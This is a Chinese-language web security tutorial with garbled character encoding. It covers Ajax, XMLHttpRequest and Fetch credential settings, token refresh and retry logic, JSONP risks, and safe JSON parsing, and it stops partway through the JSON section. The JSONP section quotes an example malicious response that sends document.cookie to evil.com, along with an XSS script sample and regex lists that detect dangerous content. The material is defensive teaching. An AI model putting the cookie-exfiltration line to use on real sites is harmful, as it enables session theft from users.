---
title: 3ã€Ajaxå¼‚æ­¥é€šä¿¡å®‰å…¨
---
## ğŸ“š ç›®å½•

1. [Ajaxå¼‚æ­¥é€šä¿¡åŸºç¡€](#1-Ajaxå¼‚æ­¥é€šä¿¡åŸºç¡€)
2. [XMLHttpRequestå®‰å…¨æœºåˆ¶](#2-XMLHttpRequestå®‰å…¨æœºåˆ¶)
3. [Fetch APIå®‰å…¨é…ç½®](#3-Fetch-APIå®‰å…¨é…ç½®)
4. [å¼‚æ­¥è¯·æ±‚è®¤è¯æµç¨‹](#4-å¼‚æ­¥è¯·æ±‚è®¤è¯æµç¨‹)
5. [JSONPè·¨åŸŸå®‰å…¨é£é™©](#5-JSONPè·¨åŸŸå®‰å…¨é£é™©)
6. [å“åº”æ•°æ®å®‰å…¨å¤„ç†](#6-å“åº”æ•°æ®å®‰å…¨å¤„ç†)
7. [å¼‚æ­¥è¯·æ±‚é˜²æŠ¤ç­–ç•¥](#7-å¼‚æ­¥è¯·æ±‚é˜²æŠ¤ç­–ç•¥)
8. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#8-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸŒ Ajaxå¼‚æ­¥é€šä¿¡åŸºç¡€


### 1.1 ä»€ä¹ˆæ˜¯Ajaxå¼‚æ­¥é€šä¿¡


**ç®€å•ç†è§£**ï¼šAjaxå°±æ˜¯è®©ç½‘é¡µåœ¨ä¸åˆ·æ–°çš„æƒ…å†µä¸‹ï¼Œå·å·åœ°å’ŒæœåŠ¡å™¨èŠå¤©

```
ä¼ ç»Ÿç½‘é¡µé€šä¿¡ï¼šç‚¹å‡»æŒ‰é’® â†’ æ•´ä¸ªé¡µé¢åˆ·æ–° â†’ æ˜¾ç¤ºæ–°å†…å®¹
Ajaxå¼‚æ­¥é€šä¿¡ï¼šç‚¹å‡»æŒ‰é’® â†’ åå°å‘é€è¯·æ±‚ â†’ éƒ¨åˆ†å†…å®¹æ›´æ–°

å°±åƒï¼š
ä¼ ç»Ÿæ–¹å¼ï¼šæ¯æ¬¡é—®é—®é¢˜éƒ½è¦é‡æ–°å¼€ä¸€ä¸ªä¼šè®®
Ajaxæ–¹å¼ï¼šåœ¨ä¼šè®®ä¸­ç›´æ¥å°å£°äº¤æµ
```

### 1.2 å¼‚æ­¥é€šä¿¡çš„å®‰å…¨æŒ‘æˆ˜


**ä¸ºä»€ä¹ˆAjaxéœ€è¦ç‰¹åˆ«å…³æ³¨å®‰å…¨ï¼Ÿ**

```
å®‰å…¨é£é™©åˆ†æï¼š

ğŸ”´ æ›´å¤šæ”»å‡»é¢ï¼š
ä¼ ç»Ÿé¡µé¢ï¼šåªæœ‰è¡¨å•æäº¤æ—¶æ‰é€šä¿¡
Ajaxé¡µé¢ï¼šéšæ—¶éƒ½åœ¨å’ŒæœåŠ¡å™¨é€šä¿¡

ğŸ”´ ç”¨æˆ·æ„ŸçŸ¥å·®ï¼š
ä¼ ç»Ÿé¡µé¢ï¼šç”¨æˆ·èƒ½çœ‹åˆ°é¡µé¢è·³è½¬
Ajaxè¯·æ±‚ï¼šç”¨æˆ·å¯èƒ½ä¸çŸ¥é“å‘ç”Ÿäº†ä»€ä¹ˆ

ğŸ”´ å¤æ‚çš„æ•°æ®æµï¼š
ä¼ ç»Ÿé¡µé¢ï¼šç®€å•çš„è¯·æ±‚-å“åº”
Ajaxåº”ç”¨ï¼šå¤šä¸ªå¹¶å‘è¯·æ±‚ã€å¤æ‚çŠ¶æ€ç®¡ç†
```

### 1.3 Ajaxå®‰å…¨é˜²æŠ¤çš„æ ¸å¿ƒåŸåˆ™


> ğŸ’¡ **æ ¸å¿ƒç†å¿µ**ï¼šå¼‚æ­¥é€šä¿¡çš„å®‰å…¨æœ¬è´¨å°±æ˜¯"ç¡®ä¿æ¯æ¬¡å·å·èŠå¤©éƒ½æ˜¯å®‰å…¨çš„"

**ä¸‰å¤§å®‰å…¨æ”¯æŸ±**ï¼š
- **ğŸ” èº«ä»½éªŒè¯**ï¼šç¡®è®¤"ä½ æ˜¯è°"
- **ğŸ›¡ï¸ æˆæƒæ§åˆ¶**ï¼šç¡®è®¤"ä½ èƒ½åšä»€ä¹ˆ"  
- **ğŸ” æ•°æ®ä¿æŠ¤**ï¼šç¡®ä¿"æ•°æ®ä¸è¢«ç¯¡æ”¹"

---

## 2. ğŸ”’ XMLHttpRequestå®‰å…¨æœºåˆ¶


### 2.1 åŒæºç­–ç•¥è¯¦è§£


**ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ï¼Ÿ**

> ğŸ›¡ï¸ **é€šä¿—è§£é‡Š**ï¼šæµè§ˆå™¨çš„"é—¨å«"æœºåˆ¶ï¼Œåªå…è®¸ç›¸åŒæ¥æºçš„ç½‘é¡µä¹‹é—´äº’ç›¸è®¿é—®

```
åŒæºåˆ¤æ–­æ ‡å‡†ï¼š
åè®® + åŸŸå + ç«¯å£ å®Œå…¨ç›¸åŒæ‰ç®—åŒæº

âœ… åŒæºç¤ºä¾‹ï¼š
https://www.example.com/page1
https://www.example.com/page2

âŒ ä¸åŒæºç¤ºä¾‹ï¼š
http://www.example.com   (åè®®ä¸åŒ)
https://api.example.com  (å­åŸŸåä¸åŒ)
https://www.example.com:8080  (ç«¯å£ä¸åŒ)
```

**åŒæºç­–ç•¥çš„å®‰å…¨ä½œç”¨**ï¼š

```javascript
// æ¶æ„ç½‘ç«™å°è¯•è¯»å–é“¶è¡Œç½‘ç«™æ•°æ®
// åŒæºç­–ç•¥ä¼šé˜»æ­¢è¿™ç§è¡Œä¸º

// åœ¨ evil.com ä¸Šçš„æ¶æ„ä»£ç 
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bank.com/account');
// âŒ æµè§ˆå™¨ä¼šé˜»æ­¢è¿™ä¸ªè¯·æ±‚
```

### 2.2 XMLHttpRequestå®‰å…¨é…ç½®


**åŸºç¡€å®‰å…¨è¯·æ±‚ç¤ºä¾‹**ï¼š

```javascript
// å®‰å…¨çš„Ajaxè¯·æ±‚å†™æ³•
function secureAjaxRequest(url, data) {
    const xhr = new XMLHttpRequest();
    
    // 1. æ£€æŸ¥URLå®‰å…¨æ€§
    if (!isValidUrl(url)) {
        throw new Error('ä¸å®‰å…¨çš„URL');
    }
    
    // 2. è®¾ç½®è¯·æ±‚æ–¹æ³•å’ŒURL
    xhr.open('POST', url, true);
    
    // 3. è®¾ç½®å®‰å…¨å¤´éƒ¨
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    
    // 4. é…ç½®å‡­è¯ä¼ é€’ï¼ˆé‡è¦ï¼ï¼‰
    xhr.withCredentials = true;  // å‘é€Cookie
    
    // 5. è®¾ç½®è¶…æ—¶æ—¶é—´
    xhr.timeout = 10000;  // 10ç§’è¶…æ—¶
    
    // 6. ç›‘å¬çŠ¶æ€å˜åŒ–
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                // âœ… è¯·æ±‚æˆåŠŸï¼Œå®‰å…¨å¤„ç†å“åº”
                handleSecureResponse(xhr.responseText);
            } else {
                // âŒ è¯·æ±‚å¤±è´¥ï¼Œå®‰å…¨å¤„ç†é”™è¯¯
                handleSecureError(xhr.status);
            }
        }
    };
    
    // 7. å‘é€è¯·æ±‚
    xhr.send(JSON.stringify(data));
}

// URLå®‰å…¨æ£€æŸ¥å‡½æ•°
function isValidUrl(url) {
    // åªå…è®¸HTTPSåè®®
    return url.startsWith('https://') && 
           !url.includes('<') &&  // é˜²æ­¢XSS
           !url.includes('javascript:');  // é˜²æ­¢è„šæœ¬æ³¨å…¥
}
```

### 2.3 å‡­è¯ä¼ é€’å®‰å…¨


**ä»€ä¹ˆæ˜¯å‡­è¯ä¼ é€’ï¼Ÿ**

> ğŸ’¡ **ç®€å•ç†è§£**ï¼šå°±åƒé—¨ç¦å¡ï¼Œæ¯æ¬¡è¿›å…¥éƒ½è¦åˆ·å¡éªŒè¯èº«ä»½

```javascript
// ğŸ” å®‰å…¨çš„å‡­è¯ä¼ é€’é…ç½®

// æƒ…å†µ1ï¼šåŒæºè¯·æ±‚ï¼ˆè‡ªåŠ¨æºå¸¦Cookieï¼‰
xhr.withCredentials = true;

// æƒ…å†µ2ï¼šè·¨åŸŸè¯·æ±‚ï¼ˆéœ€è¦æœåŠ¡å™¨é…åˆï¼‰
xhr.withCredentials = true;
// æœåŠ¡å™¨éœ€è¦è®¾ç½®ï¼šAccess-Control-Allow-Credentials: true

// æƒ…å†µ3ï¼šTokenè®¤è¯ï¼ˆæ‰‹åŠ¨æ·»åŠ ï¼‰
xhr.setRequestHeader('Authorization', 'Bearer ' + token);
```

**å‡­è¯ä¼ é€’çš„å®‰å…¨é£é™©**ï¼š

```
âš ï¸ é£é™©1ï¼šCSRFæ”»å‡»
æ¶æ„ç½‘ç«™åˆ©ç”¨ç”¨æˆ·çš„ç™»å½•çŠ¶æ€å‘èµ·æ”»å‡»

âœ… é˜²æŠ¤æ–¹æ³•ï¼š
- ä½¿ç”¨CSRF Token
- æ£€æŸ¥Refererå¤´
- ä½¿ç”¨SameSite Cookie

âš ï¸ é£é™©2ï¼šå‡­è¯æ³„éœ²
Tokenåœ¨ç½‘ç»œä¼ è¾“ä¸­è¢«æˆªè·

âœ… é˜²æŠ¤æ–¹æ³•ï¼š
- åªåœ¨HTTPSä¸‹ä¼ è¾“
- è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´
- ä½¿ç”¨å®‰å…¨çš„å­˜å‚¨æ–¹å¼
```

---

## 3. ğŸš€ Fetch APIå®‰å…¨é…ç½®


### 3.1 Fetch APIåŸºç¡€å®‰å…¨ç”¨æ³•


**Fetch vs XMLHttpRequest**ï¼š

```
XMLHttpRequestï¼šè€å¼çš„Ajaxæ–¹æ³•ï¼Œé…ç½®å¤æ‚ä½†åŠŸèƒ½å…¨é¢
Fetch APIï¼šç°ä»£åŒ–çš„ç½‘ç»œè¯·æ±‚æ–¹æ³•ï¼Œä½¿ç”¨Promiseï¼Œæ›´ç®€æ´

å®‰å…¨è§’åº¦å¯¹æ¯”ï¼š
âœ… Fetchä¼˜åŠ¿ï¼šé»˜è®¤ä¸å‘é€Cookieï¼ˆæ›´å®‰å…¨ï¼‰
âŒ FetchåŠ£åŠ¿ï¼šé”™è¯¯å¤„ç†æœºåˆ¶ä¸å¤Ÿç›´è§‚
```

**å®‰å…¨çš„Fetchè¯·æ±‚ç¤ºä¾‹**ï¼š

```javascript
// ğŸ”’ å®‰å…¨çš„Fetch APIä½¿ç”¨æ–¹æ³•
async function secureFetch(url, options = {}) {
    try {
        const response = await fetch(url, {
            method: options.method || 'GET',
            
            // ğŸ” credentialsæ¨¡å¼é…ç½®
            credentials: 'same-origin',  // åªæœ‰åŒæºæ‰å‘é€Cookie
            
            // ğŸŒ CORSæ¨¡å¼é…ç½®  
            mode: 'cors',  // å…è®¸è·¨åŸŸ
            
            // ğŸ’¾ ç¼“å­˜ç­–ç•¥
            cache: 'no-cache',  // ä¸ä½¿ç”¨ç¼“å­˜ï¼Œç¡®ä¿æ•°æ®æ–°é²œ
            
            // ğŸ“‹ è¯·æ±‚å¤´é…ç½®
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                // å¦‚æœéœ€è¦è®¤è¯
                'Authorization': `Bearer ${getToken()}`
            },
            
            // ğŸ“¤ è¯·æ±‚ä½“
            body: options.body ? JSON.stringify(options.body) : null,
            
            // â° ä¸­æ–­ä¿¡å·ï¼ˆç”¨äºå–æ¶ˆè¯·æ±‚ï¼‰
            signal: options.signal
        });
        
        // æ£€æŸ¥å“åº”çŠ¶æ€
        if (!response.ok) {
            throw new Error(`è¯·æ±‚å¤±è´¥: ${response.status}`);
        }
        
        return await response.json();
        
    } catch (error) {
        console.error('è¯·æ±‚å‡ºé”™:', error);
        throw error;
    }
}
```

### 3.2 Credentialsæ¨¡å¼è¯¦è§£


**ä¸‰ç§å‡­è¯æ¨¡å¼çš„å®‰å…¨å«ä¹‰**ï¼š

| æ¨¡å¼ | è¯´æ˜ | å®‰å…¨ç‰¹ç‚¹ | ä½¿ç”¨åœºæ™¯ |
|------|------|----------|----------|
| `omit` | ä»ä¸å‘é€Cookie | ğŸŸ¢ æœ€å®‰å…¨ | å…¬å¼€APIè°ƒç”¨ |
| `same-origin` | åªå‘åŒæºå‘é€Cookie | ğŸŸ¡ ä¸­ç­‰å®‰å…¨ | å†…éƒ¨APIè°ƒç”¨ |
| `include` | æ€»æ˜¯å‘é€Cookie | ğŸ”´ éœ€è°¨æ… | è·¨åŸŸè®¤è¯åœºæ™¯ |

```javascript
// ğŸ” ä¸åŒåœºæ™¯çš„å‡­è¯é…ç½®ç¤ºä¾‹

// åœºæ™¯1ï¼šè·å–å…¬å¼€æ•°æ®ï¼ˆæœ€å®‰å…¨ï¼‰
fetch('/api/public/news', {
    credentials: 'omit'  // ä¸å‘é€ä»»ä½•å‡­è¯
});

// åœºæ™¯2ï¼šå†…éƒ¨APIè°ƒç”¨ï¼ˆæ¨èï¼‰
fetch('/api/user/profile', {
    credentials: 'same-origin'  // åªæœ‰åŒæºæ‰å‘é€Cookie
});

// åœºæ™¯3ï¼šè·¨åŸŸè®¤è¯è¯·æ±‚ï¼ˆéœ€è¦ç‰¹åˆ«å°å¿ƒï¼‰
fetch('https://api.partner.com/data', {
    credentials: 'include',  // å‘é€æ‰€æœ‰å‡­è¯
    headers: {
        'Authorization': `Bearer ${token}`
    }
});
```

### 3.3 è¯·æ±‚ä¸­æ–­ä¸è¶…æ—¶æ§åˆ¶


**ä¸ºä»€ä¹ˆéœ€è¦ä¸­æ–­æ§åˆ¶ï¼Ÿ**

> âš ï¸ **å®‰å…¨é£é™©**ï¼šé•¿æ—¶é—´æŒ‚èµ·çš„è¯·æ±‚å¯èƒ½å¯¼è‡´èµ„æºè€—å°½ï¼Œæˆä¸ºæ”»å‡»ç›®æ ‡

```javascript
// ğŸ›‘ å®‰å…¨çš„è¯·æ±‚ä¸­æ–­ç¤ºä¾‹
function fetchWithTimeout(url, options = {}, timeout = 10000) {
    // åˆ›å»ºä¸­æ–­æ§åˆ¶å™¨
    const controller = new AbortController();
    
    // è®¾ç½®è¶…æ—¶
    const timeoutId = setTimeout(() => {
        controller.abort();  // ä¸­æ–­è¯·æ±‚
    }, timeout);
    
    return fetch(url, {
        ...options,
        signal: controller.signal  // ä¼ å…¥ä¸­æ–­ä¿¡å·
    }).then(response => {
        clearTimeout(timeoutId);  // æ¸…é™¤è¶…æ—¶
        return response;
    }).catch(error => {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            throw new Error('è¯·æ±‚è¶…æ—¶');
        }
        throw error;
    });
}

// ä½¿ç”¨ç¤ºä¾‹
fetchWithTimeout('/api/data', {}, 5000)  // 5ç§’è¶…æ—¶
    .then(response => response.json())
    .catch(error => console.error('è¯·æ±‚å¤±è´¥:', error));
```

---

## 4. ğŸ”‘ å¼‚æ­¥è¯·æ±‚è®¤è¯æµç¨‹


### 4.1 Tokenè‡ªåŠ¨é™„åŠ æœºåˆ¶


**ä»€ä¹ˆæ˜¯Tokenè‡ªåŠ¨é™„åŠ ï¼Ÿ**

> ğŸ’¡ **ç”Ÿæ´»ç±»æ¯”**ï¼šå°±åƒé“¶è¡Œå¡ï¼Œæ¯æ¬¡æ¶ˆè´¹éƒ½è‡ªåŠ¨éªŒè¯ï¼Œä¸ç”¨æ¯æ¬¡éƒ½é‡æ–°ç™»å½•

```javascript
// ğŸ« Tokenç®¡ç†å™¨
class TokenManager {
    constructor() {
        this.token = this.getStoredToken();
        this.refreshToken = this.getStoredRefreshToken();
    }
    
    // è·å–å½“å‰æœ‰æ•ˆtoken
    getToken() {
        if (this.isTokenExpired()) {
            return null;  // tokenå·²è¿‡æœŸ
        }
        return this.token;
    }
    
    // æ£€æŸ¥tokenæ˜¯å¦è¿‡æœŸ
    isTokenExpired() {
        if (!this.token) return true;
        
        try {
            const payload = JSON.parse(atob(this.token.split('.')[1]));
            return Date.now() >= payload.exp * 1000;
        } catch {
            return true;  // è§£æå¤±è´¥å½“ä½œè¿‡æœŸ
        }
    }
    
    // å­˜å‚¨æ–°token
    setToken(newToken, newRefreshToken) {
        this.token = newToken;
        this.refreshToken = newRefreshToken;
        localStorage.setItem('token', newToken);
        localStorage.setItem('refreshToken', newRefreshToken);
    }
    
    // æ¸…é™¤token
    clearToken() {
        this.token = null;
        this.refreshToken = null;
        localStorage.removeItem('token');
        localStorage.removeItem('refreshToken');
    }
    
    getStoredToken() {
        return localStorage.getItem('token');
    }
    
    getStoredRefreshToken() {
        return localStorage.getItem('refreshToken');
    }
}

const tokenManager = new TokenManager();
```

### 4.2 è¿‡æœŸè‡ªåŠ¨åˆ·æ–°æœºåˆ¶


**è‡ªåŠ¨åˆ·æ–°çš„å®‰å…¨æµç¨‹**ï¼š

```
ç”¨æˆ·å‘èµ·è¯·æ±‚ â†’ æ£€æŸ¥token â†’ tokenè¿‡æœŸï¼Ÿ
    â†“ æ˜¯                    â†“ å¦
ä½¿ç”¨refreshToken      ç›´æ¥å‘èµ·è¯·æ±‚
è·å–æ–°token               â†“
    â†“                  è·å¾—å“åº”
é‡æ–°å‘èµ·åŸè¯·æ±‚
```

```javascript
// ğŸ”„ å¸¦è‡ªåŠ¨åˆ·æ–°çš„å®‰å…¨è¯·æ±‚å‡½æ•°
async function authenticatedFetch(url, options = {}) {
    let token = tokenManager.getToken();
    
    // å¦‚æœtokenè¿‡æœŸï¼Œå…ˆå°è¯•åˆ·æ–°
    if (!token) {
        token = await refreshAccessToken();
        if (!token) {
            // åˆ·æ–°å¤±è´¥ï¼Œè·³è½¬ç™»å½•
            redirectToLogin();
            return;
        }
    }
    
    // é™„åŠ è®¤è¯å¤´
    const headers = {
        ...options.headers,
        'Authorization': `Bearer ${token}`
    };
    
    try {
        const response = await fetch(url, {
            ...options,
            headers
        });
        
        // å¦‚æœè¿”å›401ï¼Œè¯´æ˜tokenæ— æ•ˆ
        if (response.status === 401) {
            // å°è¯•åˆ·æ–°token
            const newToken = await refreshAccessToken();
            if (newToken) {
                // ç”¨æ–°tokené‡è¯•
                return authenticatedFetch(url, options);
            } else {
                // åˆ·æ–°å¤±è´¥ï¼Œè·³è½¬ç™»å½•
                redirectToLogin();
                return;
            }
        }
        
        return response;
        
    } catch (error) {
        console.error('è¯·æ±‚å¤±è´¥:', error);
        throw error;
    }
}

// åˆ·æ–°tokenå‡½æ•°
async function refreshAccessToken() {
    const refreshToken = tokenManager.refreshToken;
    if (!refreshToken) {
        return null;
    }
    
    try {
        const response = await fetch('/api/auth/refresh', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ refreshToken })
        });
        
        if (response.ok) {
            const data = await response.json();
            tokenManager.setToken(data.accessToken, data.refreshToken);
            return data.accessToken;
        }
        
        return null;
    } catch {
        return null;
    }
}
```

### 4.3 é‡è¯•æœºåˆ¶ä¸é”™è¯¯æ¢å¤


**æ™ºèƒ½é‡è¯•ç­–ç•¥**ï¼š

```javascript
// ğŸ” å¸¦é‡è¯•çš„å®‰å…¨è¯·æ±‚
async function resilientFetch(url, options = {}, maxRetries = 3) {
    let lastError;
    
    for (let i = 0; i <= maxRetries; i++) {
        try {
            const response = await authenticatedFetch(url, options);
            
            // æˆåŠŸè¿”å›å“åº”
            if (response.ok) {
                return response;
            }
            
            // åˆ¤æ–­æ˜¯å¦éœ€è¦é‡è¯•
            if (shouldRetry(response.status, i)) {
                await delay(getRetryDelay(i));  // ç­‰å¾…åé‡è¯•
                continue;
            }
            
            throw new Error(`è¯·æ±‚å¤±è´¥: ${response.status}`);
            
        } catch (error) {
            lastError = error;
            
            // ç½‘ç»œé”™è¯¯æ‰é‡è¯•
            if (isNetworkError(error) && i < maxRetries) {
                await delay(getRetryDelay(i));
                continue;
            }
            
            break;  // ä¸é‡è¯•ï¼Œç›´æ¥é€€å‡º
        }
    }
    
    throw lastError;
}

// åˆ¤æ–­æ˜¯å¦åº”è¯¥é‡è¯•
function shouldRetry(status, attempt) {
    // æœåŠ¡å™¨é”™è¯¯æˆ–ç½‘ç»œé”™è¯¯æ‰é‡è¯•
    return (status >= 500 || status === 0) && attempt < 3;
}

// è·å–é‡è¯•å»¶è¿Ÿï¼ˆæŒ‡æ•°é€€é¿ï¼‰
function getRetryDelay(attempt) {
    return Math.min(1000 * Math.pow(2, attempt), 10000);  // æœ€å¤§10ç§’
}

// åˆ¤æ–­æ˜¯å¦ä¸ºç½‘ç»œé”™è¯¯
function isNetworkError(error) {
    return error.name === 'TypeError' || 
           error.name === 'AbortError' ||
           error.message.includes('fetch');
}

// å»¶è¿Ÿå‡½æ•°
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
```

---

## 5. âš ï¸ JSONPè·¨åŸŸå®‰å…¨é£é™©


### 5.1 JSONPçš„å·¥ä½œåŸç†


**ä»€ä¹ˆæ˜¯JSONPï¼Ÿ**

> ğŸ’¡ **é€šä¿—è§£é‡Š**ï¼šJSONPå°±åƒ"å€Ÿé“å›å®¶"ï¼Œé€šè¿‡scriptæ ‡ç­¾ç»•è¿‡åŒæºç­–ç•¥

```
JSONPå·¥ä½œæµç¨‹ï¼š

1. å®¢æˆ·ç«¯åˆ›å»º<script>æ ‡ç­¾
2. è®¾ç½®srcæŒ‡å‘æœåŠ¡å™¨ï¼Œå¸¦ä¸Šå›è°ƒå‡½æ•°å
3. æœåŠ¡å™¨è¿”å› "å›è°ƒå‡½æ•°å(æ•°æ®)" æ ¼å¼çš„ä»£ç 
4. æµè§ˆå™¨æ‰§è¡Œè¿™æ®µä»£ç ï¼Œè°ƒç”¨å›è°ƒå‡½æ•°

ç¤ºä¾‹ï¼š
å®¢æˆ·ç«¯è¯·æ±‚ï¼šhttps://api.com/data?callback=handleData
æœåŠ¡å™¨è¿”å›ï¼šhandleData({"name": "å¼ ä¸‰", "age": 25})
```

```javascript
// ğŸ“œ ä¼ ç»ŸJSONPå®ç°ç¤ºä¾‹
function jsonp(url, callbackName, timeout = 10000) {
    return new Promise((resolve, reject) => {
        // åˆ›å»ºå›è°ƒå‡½æ•°
        window[callbackName] = function(data) {
            resolve(data);
            cleanup();
        };
        
        // åˆ›å»ºscriptæ ‡ç­¾
        const script = document.createElement('script');
        script.src = `${url}?callback=${callbackName}`;
        
        // è¶…æ—¶å¤„ç†
        const timer = setTimeout(() => {
            reject(new Error('JSONPè¯·æ±‚è¶…æ—¶'));
            cleanup();
        }, timeout);
        
        // æ¸…ç†å‡½æ•°
        function cleanup() {
            clearTimeout(timer);
            delete window[callbackName];
            if (script.parentNode) {
                script.parentNode.removeChild(script);
            }
        }
        
        // é”™è¯¯å¤„ç†
        script.onerror = () => {
            reject(new Error('JSONPè¯·æ±‚å¤±è´¥'));
            cleanup();
        };
        
        // æ·»åŠ åˆ°é¡µé¢
        document.head.appendChild(script);
    });
}
```

### 5.2 JSONPçš„å®‰å…¨é£é™©


**ğŸš¨ ä¸»è¦å®‰å…¨å¨èƒ**ï¼š

```
é£é™©1ï¼šå›è°ƒå‡½æ•°åŠ«æŒ
æ¶æ„æœåŠ¡å™¨å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç 

é£é™©ç¤ºä¾‹ï¼š
// å®¢æˆ·ç«¯æœŸæœ›ï¼šhandleData({"user": "å¼ ä¸‰"})
// æ¶æ„æœåŠ¡å™¨è¿”å›ï¼š
handleData({"user": "å¼ ä¸‰"}); 
document.location = "http://evil.com/steal?data=" + document.cookie;

é£é™©2ï¼šXSSæ³¨å…¥æ”»å‡»
é€šè¿‡æ•°æ®å†…å®¹æ³¨å…¥æ¶æ„è„šæœ¬

é£é™©ç¤ºä¾‹ï¼š
// æ¶æ„æ•°æ®ï¼š{"message": "<script>alert('XSS')</script>"}
// å¦‚æœç›´æ¥æ˜¾ç¤ºmessageï¼Œå°±ä¼šæ‰§è¡Œæ¶æ„è„šæœ¬

é£é™©3ï¼šCSPç»•è¿‡
JSONPå¯èƒ½ç»•è¿‡å†…å®¹å®‰å…¨ç­–ç•¥
```

### 5.3 JSONPå®‰å…¨é˜²æŠ¤


```javascript
// ğŸ›¡ï¸ ç›¸å¯¹å®‰å…¨çš„JSONPå®ç°
class SecureJSONP {
    constructor() {
        this.trustedDomains = [
            'api.trusted-site.com',
            'cdn.mycompany.com'
        ];
        this.callbackCounter = 0;
    }
    
    // å®‰å…¨çš„JSONPè¯·æ±‚
    request(url, options = {}) {
        // 1. éªŒè¯URLå®‰å…¨æ€§
        if (!this.isUrlSafe(url)) {
            return Promise.reject(new Error('ä¸å®‰å…¨çš„URL'));
        }
        
        // 2. ç”Ÿæˆå®‰å…¨çš„å›è°ƒå‡½æ•°å
        const callbackName = this.generateSafeCallback();
        
        // 3. å‘èµ·è¯·æ±‚
        return this.makeRequest(url, callbackName, options);
    }
    
    // URLå®‰å…¨æ£€æŸ¥
    isUrlSafe(url) {
        try {
            const urlObj = new URL(url);
            
            // åªå…è®¸HTTPS
            if (urlObj.protocol !== 'https:') {
                return false;
            }
            
            // æ£€æŸ¥åŸŸåç™½åå•
            return this.trustedDomains.some(domain => 
                urlObj.hostname === domain || 
                urlObj.hostname.endsWith('.' + domain)
            );
        } catch {
            return false;
        }
    }
    
    // ç”Ÿæˆå®‰å…¨çš„å›è°ƒå‡½æ•°å
    generateSafeCallback() {
        return `jsonp_callback_${Date.now()}_${++this.callbackCounter}`;
    }
    
    // å‘èµ·è¯·æ±‚
    makeRequest(url, callbackName, options) {
        return new Promise((resolve, reject) => {
            const timeout = options.timeout || 10000;
            
            // åˆ›å»ºå®‰å…¨çš„å›è°ƒå‡½æ•°
            window[callbackName] = (data) => {
                // æ•°æ®å®‰å…¨éªŒè¯
                if (this.validateResponseData(data)) {
                    resolve(data);
                } else {
                    reject(new Error('å“åº”æ•°æ®ä¸å®‰å…¨'));
                }
                cleanup();
            };
            
            // å…¶ä½™å®ç°ä¸ä¹‹å‰ç±»ä¼¼...
        });
    }
    
    // éªŒè¯å“åº”æ•°æ®
    validateResponseData(data) {
        // åŸºç¡€ç±»å‹æ£€æŸ¥
        if (typeof data !== 'object' || data === null) {
            return false;
        }
        
        // æ£€æŸ¥æ˜¯å¦åŒ…å«å¯ç–‘å†…å®¹
        const jsonStr = JSON.stringify(data);
        const dangerousPatterns = [
            /<script/i,
            /javascript:/i,
            /on\w+\s*=/i,
            /document\./i,
            /window\./i
        ];
        
        return !dangerousPatterns.some(pattern => pattern.test(jsonStr));
    }
}
```

### 5.4 JSONPçš„æ›¿ä»£æ–¹æ¡ˆ


**ç°ä»£åŒ–çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆ**ï¼š

```javascript
// âœ… æ¨èæ–¹æ¡ˆ1ï¼šCORS
// æœåŠ¡å™¨é…ç½®CORSå¤´ï¼Œä½¿ç”¨æ ‡å‡†fetch/xhr

// âœ… æ¨èæ–¹æ¡ˆ2ï¼šä»£ç†æœåŠ¡å™¨
// é€šè¿‡åŒæºä»£ç†è½¬å‘è·¨åŸŸè¯·æ±‚
fetch('/api/proxy/external-data')
    .then(response => response.json());

// âœ… æ¨èæ–¹æ¡ˆ3ï¼šPostMessage
// ç”¨äºiframeè·¨åŸŸé€šä¿¡
window.addEventListener('message', (event) => {
    if (event.origin === 'https://trusted-domain.com') {
        // å¤„ç†å®‰å…¨çš„è·¨åŸŸæ¶ˆæ¯
    }
});

// âŒ ä¸æ¨èï¼šç»§ç»­ä½¿ç”¨JSONP
// é™¤éç¡®å®æ²¡æœ‰å…¶ä»–é€‰æ‹©
```

---

## 6. ğŸ” å“åº”æ•°æ®å®‰å…¨å¤„ç†


### 6.1 JSONè§£æå®‰å…¨


**ä¸ºä»€ä¹ˆJSONè§£æéœ€è¦å…³æ³¨å®‰å…¨ï¼Ÿ**

> âš ï¸ **å®‰å…¨é£é™©**ï¼šæ¶æ„æ„é€ çš„JSONå¯èƒ½å¯¼è‡´åº”ç”¨å´©æºƒæˆ–å®‰å…¨æ¼æ´

```javascript
// ğŸ›¡ï¸ å®‰å…¨çš„JSONè§£æå‡½æ•°
function safeJsonParse(jsonString, maxSize = 1024 * 1024) {  // 1MBé™åˆ¶
    try {
        // 1. å¤§å°æ£€æŸ¥
        if (jsonString.length > maxSize) {
            throw new Error('JSONæ•°æ®è¿‡å¤§');
        }
        
        // 2. åŸºç¡€æ ¼å¼æ£€æŸ¥
        if (typeof jsonString !== 'string') {
            throw new Error('æ— æ•ˆçš„JSONæ ¼å¼');
        }
        
        // 3. å±é™©å†…å®¹æ£€æŸ¥
        if (containsDangerousContent(jsonString)) {
            throw new Error('JSONåŒ…å«å±é™©å†…å®¹');
        }
        
        // 4. è§£æJSON
        const data = JSON.parse(jsonString);
        
        // 5. ç»“æ„éªŒè¯
        if (!validateJsonStructure(data)) {
            throw new Error('JSONç»“æ„ä¸å®‰å…¨');
        }
        
        return data;
        
    } catch (error) {
        console.error('JSONè§£æå¤±è´¥:', error);
        return null;
    }
}

// æ£€æŸ¥å±é™©å†…å®¹
function containsDangerousContent(jsonString) {
    const dangerousPatterns = [
        /__proto__/,          // åŸå‹æ±¡æŸ“
        /constructor/,        // æ„é€ å‡½æ•°æ³¨å…¥
        /<script/i,          // è„šæœ¬æ ‡ç­¾
        /javascript:/i,       // JavaScriptåè®®
        /on\w+\s*=/i,        // äº‹ä»¶å¤„ç†å™¨
        /eval\s*\(/i,        // evalå‡½æ•°
        /Function\s*\(/i     // Functionæ„é€ å™¨
    ];
    
    return dangerousPatterns.some(pattern => pattern.test(jsonString));
}

// JSONç»“æ„éªŒè¯
